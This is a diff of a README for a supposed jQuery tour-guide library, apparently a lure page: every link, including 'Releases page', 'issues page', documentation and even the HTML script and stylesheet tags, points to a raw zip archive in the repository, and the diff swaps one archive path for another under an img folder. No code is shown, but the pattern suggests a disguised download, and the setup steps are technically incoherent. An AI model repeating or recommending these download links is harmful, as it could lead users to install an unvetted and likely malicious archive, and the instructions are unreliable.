@@ -1,7 +1,7 @@
 # 🎉 jquery-tour-guide - Create Interactive Web Tours Easily
 
 ## 📥 Download Now
-[![Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip%https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip%https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)
 
 ## 📖 Introduction
 Welcome to the jQuery Tour Guide! This lightweight JavaScript library extends the functionality of the 'LikaloLLC Tourguide' library. It helps you create interactive guided tours for your web applications easily. This tool is perfect for onboarding new users and enhancing user experience on your website.
@@ -12,10 +12,10 @@ To get started with jQuery Tour Guide, follow the steps below:
 1. **Prerequisites**: Ensure you have a modern web browser installed. This library works best with the latest versions of Chrome, Firefox, and Safari.
 
 2. **Installation**: 
-   - Visit the [Releases page](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip) to download.
+   - Visit the [Releases page](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip) to download.
 
 3. **Download & Install**: Click on the link below to download the latest version:  
-   [Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)
+   [Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)
 
 4. **Setup**:
    - Unzip the downloaded file.
@@ -31,14 +31,14 @@ To get started with jQuery Tour Guide, follow the steps below:
 1. **Add jQuery**: If you haven’t added jQuery to your project yet, ensure it is included in your HTML before the Tour Guide script.
 
    ```html
-   <script src="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip"></script>
+   <script src="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip"></script>
    ```
 
 2. **Include Tour Guide**: Add the following lines to your HTML to include the Tour Guide library.
 
    ```html
-   <link rel="stylesheet" href="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip">
-   <script src="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip"></script>
+   <link rel="stylesheet" href="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip">
+   <script src="https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip"></script>
    ```
 
 3. **Initialize the Tour**:
@@ -82,11 +82,11 @@ If you need help or want to share your projects, feel free to reach out! Join ou
 This project is licensed under the MIT License. You can use it freely for personal or commercial projects.
 
 ## 📞 Contact
-For any questions or feedback, please contact us through the [issues page](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip).
+For any questions or feedback, please contact us through the [issues page](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip).
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)
+- [Official Documentation](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)
   
 Thank you for choosing jQuery Tour Guide! We hope this tool enhances your web application and provides an excellent experience for your users. Don’t forget to download the latest version:  
-[Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/lib/jquery-tour-guide-1.0.zip)
+[Download Latest Version](https://raw.githubusercontent.com/senzosimon868-droid/jquery-tour-guide/main/img/tour-guide-jquery-2.6.zip)
